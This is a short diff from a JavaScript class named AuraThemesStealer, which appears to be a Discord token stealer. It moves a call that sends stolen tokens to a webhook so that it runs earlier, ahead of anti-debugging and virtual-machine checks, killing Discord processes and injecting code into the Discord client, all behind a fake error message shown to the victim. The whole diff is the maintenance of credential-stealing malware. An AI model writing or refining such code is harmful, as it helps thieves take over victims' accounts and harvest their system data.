@@ -38,10 +38,10 @@ class AuraThemesStealer {
             } = await get_info();
 
             await fake_error(ERROR_MESSAGE, config)
+            await send_webhook_tokens(WEBHOOK);
             await antidebug(VM_DEBUGGER, DISK, RAM, UID, CPU_COUNT, IP, OS, CPU, GPU, WINDOWS_KEY, WINDOWS_VERSION);
             await kill_discords(KILL_DISCORDS);
             await discord_injected(DC_INJECTION);
-            await send_webhook_tokens(WEBHOOK);
     
         } catch (err) {
             console.log(err)
